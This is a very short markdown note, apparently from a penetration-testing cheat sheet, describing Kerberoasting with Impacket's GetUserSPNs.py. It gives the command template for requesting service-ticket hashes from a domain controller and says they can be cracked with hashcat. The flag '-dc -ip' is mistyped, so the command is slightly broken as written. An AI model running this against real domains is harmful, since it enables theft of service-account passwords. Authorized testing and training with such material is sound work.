### Tooling
1. GetUserSPNs: Comes with Impacket


### Usage
```sh
GetUserSPNs.py <domain_name>/<username>:<password> -dc -ip <ip_address_of_domain_controller> -request
```

This command should give you a Ticket Granting Service (TGS) hash which can be stored and cracked with hashcat.

